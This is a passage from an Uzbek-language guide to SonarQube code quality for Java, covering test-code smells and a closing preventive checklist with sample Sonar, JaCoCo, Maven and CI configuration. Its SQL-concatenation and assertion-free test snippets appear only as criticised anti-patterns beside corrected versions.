    orderService.addItem(o.getId(), "SKU-1", 2);
    assertThat(o.getItems()).hasSize(1);
    assertThat(paymentCalculator.calculateTotal(o)).isEqualByComparingTo("1120.00");
    orderService.pay(o.getId(), new BigDecimal("1120.00"));
    assertThat(orderService.find(o.getId()).getStatus()).isEqualTo(OrderStatus.PAID);
    // ... yana o'n beshta assertion, jo'natish va hisobot ham shu yerda
}
```

`java:S5961` bitta test metodidagi assertion sonini cheklaydi, chegara profilda sozlanadi. Amaliy sabab diagnostika: oltinchi assertion yiqilsa, qolgan o'n beshtasi bajarilmaydi. Bunday testning nomini ham to'g'ri yozib bo'lmaydi, chunki u bir vaqtda to'rtta narsani tekshiradi.

```java
@Test
void pay_buyurtmani_PAID_holatiga_otkazadi() {
    Order order = OrderMother.goldMijozBuyurtmasi();   // tayyor holat

    orderService.pay(order.getId(), new BigDecimal("1260.00"));

    Order saqlangan = orderService.find(order.getId());
    // bir obyektga tegishli tekshiruvlar bitta guruhda, hammasi baholanadi
    assertAll(
        () -> assertThat(saqlangan.getStatus()).isEqualTo(OrderStatus.PAID),
        () -> assertThat(saqlangan.getPaidAmount()).isEqualByComparingTo("1260.00"),
        () -> assertThat(saqlangan.getPaidAt()).isNotNull());
}
```

Tavsiya: bitta testda bitta xatti-harakatni tekshiring va bog'liq tekshiruvlarni `assertAll` bilan birlashtiring.

### 30.11 Test klassida test metodi yo'qligi

Bu shikoyat ko'pincha refaktoringdan keyin qoladi.

```java
// nomi Test bilan tugaydi, lekin bitta @Test metodi yo'q
class PaymentCalculatorTest {

    static Order buyurtma(String id, BigDecimal narx) {
        return new Order(id, 1, narx);
    }

    @BeforeEach
    void setUp() { /* ... */ }
}
```

`java:S2187` aytadi: test klassi deb nomlangan tur kamida bitta test o'z ichiga olishi kerak. Sonar buni Blocker darajasida ko'rsatadi, chunki fayl test sifatida o'qiladi, lekin hech narsa bajarilmaydi. Odatiy sabab: testlar ko'chirilgan, yordamchi metodlar qolib ketgan. Yechim uni `...Fixtures` yoki `...Mother` deb qayta nomlash.

```properties
# sonar-project.properties, qaysi fayl production, qaysi biri test ekani aniq ajratiladi
sonar.sources=src/main/java
sonar.tests=src/test/java

# test deb hisoblanadigan fayllar
sonar.test.inclusions=**/*Test.java,**/*Tests.java,**/*IT.java

# yordamchi fixture lar test emas, ular alohida qoida to'plamiga tushmasin
sonar.test.exclusions=**/*Fixtures.java,**/*Mother.java,**/TestSupport.java

# JaCoCo hisobotining yo'li, aks holda coverage nol ko'rinadi
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
```

Tavsiya: yordamchi klass nomida `Test` so'zini qoldirmang va `sonar.test.inclusions` ni aniq belgilang.

### 30.12 Faqat qamrov uchun yozilgan, natijani tekshirmaydigan test

Katalogdagi eng xavfli holat, chunki u metrikani yaxshilab ko'rsatadi.

```java
@Test
void barcha_getterlarni_chaqiramiz() {
    Order o = new Order("ORD-1", new Customer("CUST-7", "Toshkent", Tier.GOLD));
    o.getId(); o.getCustomer(); o.getStatus(); o.getTotal();   // natija tekshirilmaydi
    assertNotNull(o);                                          // doim rost
    assertTrue(true);                                          // soxta assertion
}
```

Sonar bir nechta qoida bilan javob beradi: `assertTrue(true)` uchun `java:S2701`, yangi obyektni `assertNotNull` bilan tekshirish esa ma'nosiz assertion deb belgilanadi. Metrik tomondan bu test coverage ni ko'taradi va gate ni yashil qiladi. Shuning uchun coverage raqamiga yakka o'zida ishonib bo'lmaydi: u qaysi qatorlar bajarilganini o'lchaydi, tekshirilganini emas. Mutation testing bunday testni ochib beradi, Sonar faqat qisman ushlaydi.

```xml
<!-- getter va DTO larni qamrovdan chiqarish, soxta test yozishga sabab qolmasin -->
<properties>
  <sonar.coverage.exclusions>
    **/dto/**,
    **/config/**,
    **/*Application.java
  </sonar.coverage.exclusions>
  <!-- generatsiya qilingan kod umuman tahlilga kirmaydi -->
  <sonar.exclusions>**/generated/**</sonar.exclusions>
</properties>
```

Tavsiya: qamrov uchun soxta test yozish o'rniga mantiqsiz fayllarni `sonar.coverage.exclusions` bilan chiqarib, qolgan kodni haqiqiy assertion bilan qoplang.

### 30.13 Oddiy yondashuv va arxitektor yondashuvi

| Holat | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Test assertion siz chiqdi | `assertNotNull` qo'shib issue ni yopish | Maqsadni aniqlab, natija haqida aniq assertion yozish |
| Istisno tekshiruvi | `try` va `fail` ni qoldirish | `assertThrows` ga o'tish va istisno xabarini tekshirish |
| `@Disabled` test | Issue ni won't fix deb belgilash | Sabab va ticket yozib, sonini CI da chegaralash |
| Asinxron natijani kutish | `Thread.sleep` vaqtini oshirish | Shartni poll qiladigan kutish, timeout faqat chegara |
| Testlar bir-biriga xalal beradi | Metod tartibini `@Order` bilan majburlash | Holatni `@BeforeEach` da tiklash, static maydonni olib tashlash |
| Takrorlangan setup | Duplication qoidasini o'chirish | Builder va object mother bilan yagona manbaga chiqarish |
| Juda ko'p assertion | Qoida chegarasini oshirish | Testni holatlarga bo'lib, bog'liq tekshiruvlarni `assertAll` ga yig'ish |
| Coverage yetmaydi | Getter chaqiradigan test yozish | Haqiqiy mantiqni qoplash, mantiqsiz fayllarni chiqarish |

### 30.14 Tuzoq va yechim

| Tuzoq | Nega xavfli | Yechim |
| --- | --- | --- |
| `sonar.exclusions` ga `src/test/**` qo'shish | Test kodi sifati umuman o'lchanmaydi va flaky testlar ko'payadi | `sonar.test.inclusions` bilan to'g'ri ajratish, tahlilni saqlash |
| Assertion kutubxonasini Sonar tanimasligi | Assertion bor, lekin `java:S2699` baribir chiqadi | Standart kutubxonadan foydalanish yoki custom metodni qoidaga tanitish |
| `assertThrows` da `Exception.class` ni kutish | Har qanday xato testni o'tkazadi, hatto `NullPointerException` ham | Eng aniq istisno turini ko'rsatish |
| Faqat line coverage ga qarash | Shart tarmoqlari tekshirilmay qoladi | Branch coverage ni ham gate ga kiritish |
| Mock ni haddan ko'p ishlatish | Test faqat o'z mock ini tekshiradi | Integratsion sathni Testcontainers bilan qoplash, testlash qo'llanmasidagi Testcontainers mavzusida |
| Flaky testni `@Disabled` bilan yopish | Muammo yashiriladi va unutiladi | Sababni topish va kutishni shartga bog'lash, testlash qo'llanmasidagi flaky testlar mavzusi |

### 30.15 Amalda qo'llash

- [ ] Sonar hisobotini `scopes=TEST` filtri bilan oching va eng ko'p uchraydigan uchta qoidani aniqlang.
- [ ] `java:S2699` va `java:S2970` issue larini birinchi navbatda yoping, ular doim yashil testni bildiradi.
- [ ] `grep -rE "@Disabled|@Ignore" src/test/java` natijasidagi har bir testga sabab va ticket yozing yoki olib tashlang.
- [ ] `grep -rn "Thread.sleep" src/test/java` natijasidagi har bir joyni shartga asoslangan kutishga almashtiring.
- [ ] `try` va `fail` kombinatsiyasini `assertThrows` ga o'tkazib, lambdada bitta chaqiruv qoldiring.
- [ ] Eng ko'p takrorlanadigan test ma'lumotini object mother yoki fixture fayliga chiqaring.
- [ ] `sonar.tests`, `sonar.test.inclusions` va `sonar.test.exclusions` qiymatlarini aniq yozib, yordamchi klasslarni test to'plamidan chiqaring.
- [ ] Bitta modulda mutation testing ni ishga tushirib, coverage bilan haqiqiy tekshiruv orasidagi farqni ko'rsating.

## 31. Xatolarga tushmaslik uchun yakuniy tavsiyalar (Preventive Checklist)

Bu hujjatning oxirgi bobi. Undan oldingi boblarda Sonar nimani qanday hisoblashini, qaysi qoida qachon ishga tushishini va quality gate shartlari qanday tekshirilishini ko'rdik. Shu bilimdan amaliy natija chiqarish vaqti keldi: quyida tushuntirish emas, qoida bor. Har bir band kundalik ishda bajariladigan harakat, uni jamoa kelishuvi yoki shaxsiy odat sifatida qabul qilish mumkin.

### 31.1 Kod yozishdan oldin: metod kichik, nom aniq, shart sodda bo'lsin degan odat

Sonar hisoblaydigan ko'pchilik metrika bitta sababdan o'sadi: metod o'z hajmidan kattalashib ketadi. Shuning uchun eng arzon profilaktika kod yozilgandan keyin emas, yozilishidan oldin boshlanadi. Uchta odat deyarli barcha maintainability shikoyatini kelib chiqishidan to'xtatadi.

Birinchi odat: metod bitta ish qilsin. Metod nomini aytganda "va" so'zi kerak bo'lsa, u ikkita metod. `validateAndSaveAndNotify` nomining o'zi cognitive complexity o'sishini oldindan e'lon qiladi.

Ikkinchi odat: nom izohni almashtirsin. `if (s == 2)` qatorini izoh bilan tushuntirish o'rniga `if (status == OrderStatus.PAID)` deb yozish kerak. Sonar sehrli sonlar va noaniq nomlar uchun alohida shikoyat qiladi, lekin asosiy foyda Sonar emas, o'qiydigan odam.

Uchinchi odat: shart yassi bo'lsin. Ichma-ich joylashgan `if` lar cognitive complexity ni ko'paytiradi, chunki o'quvchi bir vaqtda bir nechta shartni boshida ushlab turishi kerak. Yechim guard clause, ya'ni erta `return`.

```java
// Yomon: ichma-ich shartlar, cognitive complexity tez o'sadi
public BigDecimal hisobla(Order order) {
    if (order != null) {
        if (order.getItems() != null) {
            if (!order.getItems().isEmpty()) {
                return order.getItems().stream()
                    .map(OrderItem::getSum)
                    .reduce(BigDecimal.ZERO, BigDecimal::add);
            }
        }
    }
    return BigDecimal.ZERO;
}

// Sonar o'tadigan variant: guard clause bilan yassi tuzilma
public BigDecimal hisobla(Order order) {
    if (order == null) {
        return BigDecimal.ZERO;          // erta chiqish
    }
    List<OrderItem> items = order.getItems();
    if (items == null || items.isEmpty()) {
        return BigDecimal.ZERO;          // bo'sh holat ham erta chiqadi
    }
    return items.stream()
        .map(OrderItem::getSum)
        .reduce(BigDecimal.ZERO, BigDecimal::add);
}
```

Qoida sifatida: yangi metod yozganingizda IDE da uning qatorlarini sanang. Yigirma qatordan oshsa, ajratish uchun sabab izlang. Ellik qatordan oshsa, ajratmaslik uchun sabab izlang.

### 31.2 Reliability toifasiga tushmaslik uchun kundalik qoidalar ro'yxati

Reliability toifasi, ya'ni bug turidagi issue lar, kodning ishlamay qolishi ehtimolini bildiradi. Bu toifa quality gate da eng qattiq bloklanadigan toifa bo'lishi kerak, chunki uning narxi production da to'lanadi.

| Kundalik qoida | Nega shunday (Sonar nuqtai nazaridan) |
| --- | --- |
| `Optional` ni `get()` bilan ochmang, `orElseThrow` yoki `orElse` ishlatilsin | Sonar tekshirilmagan `get()` ni potensial exception manbasi deb belgilaydi |
| Tashqi manbadan kelgan obyektni ishlatishdan oldin null holati aniqlansin | Null ga murojaat qilish ehtimoli bor yo'l topilsa, bug ochiladi |
| `BigDecimal` ni `equals` bilan emas, `compareTo` bilan solishtiring | `equals` scale ni ham hisobga oladi, `2.0` va `2.00` teng chiqmaydi |
| `catch` bloki bo'sh qolmasin, hech bo'lmasa log yozilsin | Yutilgan exception xatoni yashiradi, bu alohida bug qoidasi |
| Resursni `try-with-resources` bilan oching | Yopilmagan stream va connection resurs oqishi deb baholanadi |
| Thread va vaqt bilan ishlaganda o'zgaruvchan umumiy holatdan voz kechilsin | Sinxronlanmagan umumiy holat Sonar uchun yuqori jiddiylikdagi bug |
| Shart ichida qiymat o'zgartirmang | Yon effektli shart tekshirib bo'lmaydigan kod hosil qiladi |
| `switch` da `default` yoki enum ning barcha holati qoplansin | Qoplanmagan holat kutilmagan oqimga olib keladi |
| Taqqoslashda har doim ma'lum qiymat chapda turmasin degan odatni tashlang, `Objects.equals` ishlatilsin | Ikki tomoni ham null bo'lishi mumkin bo'lgan taqqoslash xavfli |

Eng muhim amaliy maslahat: yangi bug issue paydo bo'lsa, uni "keyin" ro'yxatiga qo'shmang. Bug toifasidagi issue odatda bir necha qatorlik tuzatish, lekin bir hafta o'tgach uning konteksti esdan chiqadi.

### 31.3 Security toifasiga tushmaslik uchun kundalik qoidalar ro'yxati

Security toifasi ikkiga bo'linadi: vulnerability, ya'ni Sonar o'zi xavf deb hisoblagan kod, va security hotspot, ya'ni odam ko'rib qarorini aytishi kerak bo'lgan joy. Hotspot ni "xato" deb emas, "ko'rikdan o'tishi shart" deb qabul qilish kerak.

| Kundalik qoida | Nega shunday |
| --- | --- |
| SQL ni satr qo'shish bilan yasamang, parametr ishlatilsin | Satr konkatenatsiyasi SQL injection sifatida belgilanadi |
| Parol, token va kalit kodda turmasin, konfiguratsiya yoki secret store dan kelsin | Kodga yozilgan sir yuqori jiddiylikdagi vulnerability |
| Log ga foydalanuvchi kiritgan ma'lumotni tozalamasdan yozmang | Log injection va shaxsiy ma'lumot oqishi xavfi |
| Kriptografiyada zamonaviy algoritm va kuchli tasodif manbasi ishlatilsin | Eskirgan algoritm va `Random` xavfli deb baholanadi |
| Fayl yo'lini tashqi kiritmadan to'g'ridan to'g'ri yasamang | Path traversal xavfi hotspot sifatida ochiladi |
| Exception matnini foydalanuvchiga to'liq qaytarmang | Ichki tuzilma oshkor bo'lishi xavf deb hisoblanadi |
| Hotspot ni "safe" deb yopganda izoh yozilsin | Izohsiz yopilgan hotspot keyingi ko'rikda qayta ochiladi |
| Avtorizatsiya tekshiruvi kontrollerda emas, servis chegarasida bo'lsin | Chetlab o'tiladigan tekshiruv Sonar e'tiboridan tashqarida ham xavfli |

```sql
-- Yomon: satr qo'shish, Sonar SQL injection deb belgilaydi
-- "SELECT * FROM payments WHERE client_id = " + clientId

-- Sonar o'tadigan variant: nomli parametr
SELECT p.id, p.amount, p.status
FROM payments p
WHERE p.client_id = :clientId      -- parametr sifatida uzatiladi
  AND p.created_at >= :fromDate
ORDER BY p.created_at DESC;
```

Alohida eslatma: `@Query` ichida ham parametr ishlatilsin. JPQL satrini Java tomonida yig'ish Sonar uchun oddiy konkatenatsiya bilan bir xil darajada xavfli.

### 31.4 Maintainability toifasiga tushmaslik uchun kundalik qoidalar ro'yxati

Maintainability, ya'ni code smell, hujjatdagi issue larning aksariyatini tashkil qiladi. Bu toifa kodni buzmaydi, lekin keyingi o'zgarishning narxini oshiradi. Shuning uchun uni bloklash emas, chegara qo'yish orqali boshqarish to'g'ri.

| Kundalik qoida | Nega shunday |
| --- | --- |
| Cognitive complexity chegarasini metod darajasida kuzatib turing | Eng tez o'sadigan va eng ko'p shikoyat tug'diradigan metrika |
| Takrorlangan blokni uchinchi marta ko'rganda ajratib oling | Duplication foizi quality gate shartiga kiradi |
| Ishlatilmagan parametr, o'zgaruvchi va import darhol o'chirilsin | Arzon tuzatish, lekin issue soni sezilarli kamayadi |
| Sehrli son nomli konstantaga chiqarilsin | Nomsiz son ma'nosini yo'qotadi va xato manbasi bo'ladi |
| `TODO` va `FIXME` ga issue havolasi qo'shilsin yoki o'chirilsin | Izohsiz `TODO` doimiy smell sifatida qoladi |
| Izohga olingan kod saqlanmasin, git tarixi bor | Kommentdagi kod alohida qoida bilan belgilanadi |
| Metod parametri soni ettitadan oshmasin, obyektga yig'ilsin | Ko'p parametr chaqiruv joyida xatoga olib keladi |
| Deprecated API ishlatilganda almashtirish rejasi yozilsin | Eskirgan API keyingi versiya yangilashini bloklaydi |

### 31.5 Test yozishda doimo bajariladigan minimal to'plam

Test tafsilotlari testlash qo'llanmasida bor, bu yerda faqat Sonar o'lchoviga tegishli minimal to'plam. Sonar coverage ni o'zi hisoblamaydi, JaCoCo hisoblotini o'qiydi. Shuning uchun birinchi qoida: hisobot haqiqatan ham yaratilib, Sonar ga uzatilsin.

Har bir yangi public metod uchun minimal to'plam uchta testdan iborat. Birinchisi oddiy muvaffaqiyatli yo'l. Ikkinchisi chegara holati, ya'ni bo'sh ro'yxat, nol qiymat, eng katta qiymat. Uchinchisi xato yo'li, ya'ni exception yoki rad etilgan natija.

```java
// Minimal to'plam: muvaffaqiyat, chegara, xato
@Test
void toliq_tolov_statusni_PAID_ga_otkazadi() {
    Order order = order(BigDecimal.valueOf(100));
    PaymentResult natija = service.pay(order, BigDecimal.valueOf(100));
    assertThat(natija.status()).isEqualTo(OrderStatus.PAID);
}

@Test
void nol_summa_rad_etiladi() {                 // chegara holati
    Order order = order(BigDecimal.valueOf(100));
    assertThatThrownBy(() -> service.pay(order, BigDecimal.ZERO))
        .isInstanceOf(InvalidAmountException.class);
}

@Test
void qoldiq_yetmasa_xato_qaytaradi() {         // xato yo'li
    Order order = order(BigDecimal.valueOf(100));
    assertThatThrownBy(() -> service.pay(order, BigDecimal.valueOf(40)))
        .isInstanceOf(PartialPaymentException.class)
        .hasMessageContaining("qoldiq");
}
```

Ikkinchi qoida: assertion bo'lmagan test yozmang. Sonar assertion siz test metodini alohida belgilaydi, va bu to'g'ri, chunki bunday test faqat coverage raqamini ko'taradi. Uchinchi qoida: `@Disabled` testni uzoq saqlamang. O'chirilgan test ham smell, ham yolg'on xotirjamlik.

To'rtinchi qoida: shartli tarmoqni test qilgan bo'lsangiz, natijani ham tekshiring. Metod chaqirilgani coverage uchun yetarli, lekin xatoni ushlash uchun yetarli emas. Aynan shu joyda 100% coverage aldaydi: barcha qator qoplangan bo'lishi mumkin, lekin hech bir natija tekshirilmagan.

### 31.6 Commit qilishdan oldingi shaxsiy tekshiruv ro'yxati

Commit oldidagi tekshiruv ikki daqiqa oladi va PR dagi munozarani sezilarli qisqartiradi. Eng foydali qadam, lokal tahlilni ishga tushirish, ya'ni serverga yubormasdan natijani ko'rish.

```bash
# 1. Formatlash va kompilyatsiya
./mvnw -q clean verify -DskipITs

# 2. JaCoCo hisoboti yaratilganini tekshirish
test -f target/site/jacoco/jacoco.xml && echo "coverage hisoboti bor"

# 3. Faqat o'zgargan kodni ko'rish, ortiqcha narsa kirmaganiga ishonch
git diff --stat
git diff --cached

# 4. Lokal Sonar tahlili (server manzili va token muhit o'zgaruvchisida)
./mvnw -q sonar:sonar -Dsonar.host.url="$SONAR_HOST" \
  -Dsonar.token="$SONAR_TOKEN"
```

Shaxsiy ro'yxat quyidagicha: yangi sehrli son yo'q, yangi `System.out` yo'q, yangi bo'sh `catch` yo'q, yangi `TODO` havolasiz emas, debug uchun qo'yilgan vaqtinchalik kod olib tashlangan, test nomi nimani tekshirayotganini aytadi.

### 31.7 Pull request ochishdan oldingi tekshiruv ro'yxati

PR darajasida asosiy savol boshqa: bu o'zgarish quality gate ni o'tadimi va ko'rikchi uni tushunadimi. Sonar PR tahlilida odatda faqat yangi kod baholanadi, shuning uchun PR ni kichik ushlash eng samarali vosita.

Birinchi band: PR bitta mavzuga tegishli bo'lsin. Refaktoring va yangi funksiya bitta PR da aralashsa, Sonar natijasini ham, ko'rikni ham o'qish qiyinlashadi.

Ikkinchi band: PR tavsifida nima o'zgarganini va nega o'zgarganini yozing. Uchinchi band: agar quality gate yangi kod coverage sababli qizil bo'lsa, test qo'shing yoki coverage dan chiqarilishi kerak bo'lgan kodni to'g'ri belgilang. To'rtinchi band: hotspot paydo bo'lsa, uni PR da izohlab bering, ko'rikchi qaroringizni ko'rishi kerak.

| Tuzoq | Yechim |
| --- | --- |
| PR katta, Sonar yuzlab issue ko'rsatadi | PR ni mavzuga bo'lib yuboring, har biri alohida ko'rikdan o'tsin |
| Yangi kod coverage past, chunki getter va DTO sanaladi | Yaratilgan va oddiy kodni tahlildan chiqarish qoidasini loyihada bir marta sozlang |
| Gate qizil, lekin sabab eski kodda | Yangi kod shartlariga tayanadigan gate ni tanlang, eski qarzni alohida reja bilan yoping |
| Hotspot har PR da qayta ochiladi | Yopishda sabab yozilsin, izohsiz yopish keyin bekor qiladi |
| Coverage hisoboti yo'q, Sonar nolni ko'rsatadi | Hisobot yo'li konfiguratsiyada aniq ko'rsatilsin, CI da fayl mavjudligi tekshirilsin |
| Test kodi o'zi issue to'playdi | Test uchun alohida profil va alohida chegara kelishilsin |
| Tahlil sekun, ishlab chiquvchi kutadi | Tahlilni alohida qadamga chiqaring, keshni saqlang |
| Issue "false positive" deb ko'p yopiladi | Qoidani profil darajasida muhokama qiling, har joyda alohida yopish emas |

### 31.8 Jamoaviy kelishuv: nimani bloklash, nimani ogohlantirish darajasida qoldirish

Eng ko'p uchraydigan boshqaruv xatosi, hammasini bloklash. Natijada jamoa gate ni chetlab o'tish yo'lini izlaydi. To'g'ri yondashuv darajalarni ajratishdir: ba'zi narsa merge ni to'xtatadi, ba'zisi faqat ko'rinadi.

Bloklash uchun nomzodlar: yangi kodda bug toifasidagi issue, yangi kodda vulnerability, ko'rikdan o'tmagan security hotspot, yangi kod coverage belgilangan foizdan past, yangi kodda duplication belgilangan foizdan yuqori.

Ogohlantirish uchun nomzodlar: maintainability issue lar umumiy soni, eski koddagi technical debt, past jiddiylikdagi uslub shikoyatlari, metod uzunligi bo'yicha chegaradan ozgina oshish.

| Mavzu | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Quality gate shartlari | Hammasini qizil qilish, keyin chetlab o'tish | Yangi kodga qattiq, eski kodga reja bilan yondashish |
| Coverage | Butun loyiha uchun bitta katta foiz talab qilish | Yangi kod coverage va shartli tarmoq sifatiga qarash |
| Yangi qoida qo'shish | Darhol bloklovchi qilib yoqish | Avval ogohlantirish, statistikani ko'rib keyin bloklash |
| False positive | Har joyda alohida yopish | Profil darajasida qoidani muhokama qilib sozlash |
| Technical debt | Katta refaktoring sprinti rejalashtirish | Tegilgan faylni tozalash qoidasi, bosqichma bosqich |
| Sonar vaqti | Har commit da to'liq tahlil | PR da yangi kod tahlili, asosiy branch da to'liq tahlil |
| Hotspot | Hammasini "safe" deb yopish | Har birini izohlab, qarorni tarixda saqlash |
| Test kodi tahlili | Umuman tahlildan chiqarish | Alohida profil, assertion va duplication qoidalari saqlanadi |
| Issue mas'uliyati | Kimdir keyin tuzatadi | Issue muallifi, ya'ni PR egasi tuzatadi |
| Natijani o'qish | Faqat yashil yoki qizil rangga qarash | Trendga qarash, issue zichligi kamayayotganini kuzatish |

Kelishuvni og'zaki emas, yozma qiling. Repozitoriyadagi qisqa hujjat, ya'ni "bizda nima bloklanadi" ro'yxati, har yangi a'zoga vaqt tejaydi.

### 31.9 Yangi loyihani birinchi kundan toza boshlash uchun sozlamalar to'plami

Yangi loyihada eng katta imkoniyat shu: hali qarz yo'q. Birinchi kunda sozlangan uchta narsa keyinchalik oylab vaqt tejaydi.

Birinchisi, loyiha kaliti va manba kodlash. Ikkinchisi, coverage hisoboti yo'li. Uchinchisi, tahlildan chiqariladigan yaratilgan kod.

```properties
# sonar-project.properties yoki pom.xml xossalari
sonar.projectKey=ombor-servisi
sonar.projectName=Ombor servisi
sonar.sourceEncoding=UTF-8
sonar.java.source=21

# Coverage hisoboti yo'li: JaCoCo XML, aggregate modul uchun ham
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml

# Yaratilgan va tahlilga aloqasi yo'q kodni chiqarish
sonar.exclusions=**/generated/**,**/dto/**Mapper*.java
sonar.coverage.exclusions=**/config/**,**/*Application.java
```

Maven tomonida JaCoCo ni to'g'ri bog'lash muhim: `prepare-agent` test fazasidan oldin, `report` esa `verify` dan oldin ishlashi kerak. Aks holda hisobot bo'sh bo'ladi va Sonar coverage ni nol deb ko'rsatadi.

```xml
<plugin>
  <groupId>org.jacoco</groupId>
  <artifactId>jacoco-maven-plugin</artifactId>
  <version>0.8.12</version>
  <executions>
    <execution>
      <id>agent</id>
      <goals><goal>prepare-agent</goal></goals>
    </execution>
    <execution>
      <id>report</id>
      <phase>verify</phase>              <!-- hisobot verify da yaratiladi -->
      <goals><goal>report</goal></goals>
    </execution>
  </executions>
</plugin>
```

CI tomonida tahlilni alohida qadam qiling va gate natijasini kuting. Kutmasangiz, qizil gate merge ni to'xtatmaydi.

```yaml
# CI da tahlil va gate natijasini kutish
- name: Test va coverage
  run: ./mvnw -B clean verify

- name: Sonar tahlili
  env:
    SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
  run: >
    ./mvnw -B sonar:sonar
    -Dsonar.projectKey=ombor-servisi
    -Dsonar.qualitygate.wait=true      # gate natijasi kutiladi
```

Shuni ham eslatib o'tish kerak: `sonar.qualitygate.wait` xulq-atvori va mavjudligi versiyaga qarab farq qiladi, shuning uchun o'z serveringiz versiyasi hujjatida tasdiqlang.

### 31.10 Eng ko'p uchraydigan o'nta xatoni oldini oluvchi o'nta odat

Birinchi odat: metodni yozib bo'lgach, uning eng chuqur `if` darajasini sanash. Ikkinchi odat: `Optional` qaytargan metodni chaqirganda darhol natija yo'q holatini hal qilish. Uchinchi odat: pul miqdorini faqat `BigDecimal` da saqlash va `compareTo` bilan solishtirish.

To'rtinchi odat: har bir `catch` ichida nima bo'layotganini bir qatorda tushuntirish. Beshinchi odat: SQL va JPQL ni hech qachon satr qo'shish bilan yasamaslik. Oltinchi odat: sirni konfiguratsiyadan olish, kodga yozmaslik.

Yettinchi odat: uchinchi takrorlanishda umumiy metod ajratish. Sakkizinchi odat: yangi test yozganda assertion ni testdan oldin o'ylab qo'yish. To'qqizinchi odat: `TODO` yozganda unga issue raqami qo'shish. O'ninchi odat: PR ni yuborishdan oldin o'z diff ini boshqa odam ko'zi bilan bir marta o'qish.

Bu o'nta odatning hammasi birgalikda kuniga besh daqiqa vaqt oladi. Ularning o'rnini bosadigan vosita yo'q, chunki Sonar xatoni topadi, lekin odatni yarata olmaydi.

### 31.11 Sonar ni dushman emas, vosita sifatida ishlatish

Sonar ni dushman sifatida ko'rish ikki ko'rinishda bo'ladi. Birinchisi, raqamni ko'tarish uchun mazmunsiz test yozish. Ikkinchisi, issue ni tuzatish o'rniga qoidani o'chirish. Ikkalasi ham o'lchovni buzadi, muammoni esa joyida qoldiradi.

Vosita sifatida ishlatish boshqacha ko'rinadi. Issue ro'yxati vazifa ro'yxati emas, balki signal. Agar bitta modulda cognitive complexity doim oshsa, bu modulning mas'uliyati noto'g'ri taqsimlangan degani. Agar duplication bir nechta servis o'rtasida takrorlansa, umumiy kutubxona yoki umumiy abstraksiya kerak degani. Sonar bu xulosani aytmaydi, lekin uni ko'rishga yetarli ma'lumot beradi.

Shuni ham ochiq aytish kerak: yashil quality gate kodning to'g'riligini kafolatlamaydi. U faqat belgilangan shartlar bajarilganini aytadi. Mantiq xatosi, noto'g'ri talab va yomon arxitektura yashil gate bilan ham mavjud bo'la oladi. Shuning uchun Sonar ko'rikni almashtirmaydi, uni arzonlashtiradi: ko'rikchi uslub va aniq xatolar bilan emas, mantiq va qaror bilan shug'ullanadi.

Oxirgi fikr: o'lchovni maqsadga aylantirmang. Maqsad, o'zgartirish oson va buzilishi qiyin kod. Sonar shu maqsadga qanchalik yaqinlashayotganingizni ko'rsatadigan asboblar panelidan biri.

### 31.12 Amalda qo'llash

- [ ] Jamoada bitta sahifali kelishuv yozing: nima merge ni bloklaydi, nima faqat ogohlantiradi.
- [ ] Yangi loyihada birinchi kuni `sonar.coverage.jacoco.xmlReportPaths` va exclusions qiymatlarini sozlang.
- [ ] CI da tahlil qadamini qo'shib, gate natijasini kutishni yoqing va qizil gate da merge to'xtashini tekshirib ko'ring.
- [ ] Commit oldidan ishlatiladigan shaxsiy tekshiruv ro'yxatini repozitoriyaga qo'ying va bir hafta amal qilib ko'ring.
- [ ] Bitta eng ko'p shikoyat to'playdigan modulni tanlab, undagi uchta eng yuqori cognitive complexity metodini ajratib yozing.
- [ ] Barcha ochiq security hotspot larni ko'rib chiqing va har biriga qarorni izoh bilan yozing.
- [ ] Assertion siz va `@Disabled` holatidagi testlarni toping, har biriga qaror qabul qiling: to'ldirish yoki o'chirish.
- [ ] Oylik bir marta trendga qarang: yangi kod issue zichligi kamayayotganini yoki o'sayotganini yozib boring.
